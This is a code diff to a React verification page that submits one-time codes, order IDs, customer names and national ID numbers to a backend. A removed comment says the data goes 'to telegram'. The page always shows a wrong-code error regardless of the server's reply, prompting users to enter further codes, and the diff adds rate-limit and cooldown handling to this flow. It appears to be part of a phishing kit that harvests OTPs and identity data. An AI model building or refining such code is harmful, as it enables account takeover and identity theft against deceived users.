@@ -68,32 +68,29 @@ export default function VerifyPage() {
     if (isSubmitting || submitCooldown > 0) return;
     if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
     const submittedCode = code;
-
     setIsSubmitting(true);
-
-    // Send to telegram immediately
     try {
-      await fetch("/api/verify", {
+      const res = await fetch("/api/verify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ code: submittedCode, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
       });
-    } catch {}
-
-    setIsSubmitting(false);
-
-    // Show wrong code error immediately
+      const data = await res.json().catch(() => ({}));
+      const cooldown = res.status === 429 ? (data.retryAfter ?? 30) : 5;
+      setSubmitCooldown(cooldown);
+      submitCooldownRef.current = setInterval(() => {
+        setSubmitCooldown(prev => {
+          if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
+          return prev - 1;
+        });
+      }, 1000);
+    } catch {
+      setSubmitCooldown(5);
+    } finally {
+      setIsSubmitting(false);
+    }
     setWrongCode(true);
     setCode("");
-
-    // 5 second cooldown before they can submit again
-    setSubmitCooldown(5);
-    submitCooldownRef.current = setInterval(() => {
-      setSubmitCooldown(prev => {
-        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
-        return prev - 1;
-      });
-    }, 1000);
   }
 
   // ── Confirmed Popup ──
@@ -242,13 +239,20 @@ export default function VerifyPage() {
                     if (isResending || resendCooldown > 0) return;
                     setIsResending(true);
                     try {
-                      await fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName }) });
+                      const res = await fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName }) });
+                      const data = await res.json().catch(() => ({}));
+                      const cooldown = res.status === 429 ? (data.retryAfter ?? 60) : 60;
+                      clearInterval(cooldownRef.current!);
+                      setResendCooldown(cooldown);
+                      cooldownRef.current = setInterval(() => {
+                        setResendCooldown(prev => {
+                          if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
+                          return prev - 1;
+                        });
+                      }, 1000);
+                      if (res.ok && data.ok) { setResent(true); setWrongCode(false); setTimeout(() => setResent(false), 3000); }
                     } catch {}
                     setIsResending(false);
-                    setResent(true);
-                    setWrongCode(false);
-                    setTimeout(() => setResent(false), 3000);
-                    startCooldown();
                   }}
                   className="flex items-center justify-center gap-1.5 py-3 rounded-xl text-xs font-bold transition-all disabled:opacity-40 disabled:cursor-not-allowed"
                   style={{ backgroundColor: "rgba(188,146,85,0.06)", color: "#A77D4B", border: "1px solid rgba(188,146,85,0.15)" }}
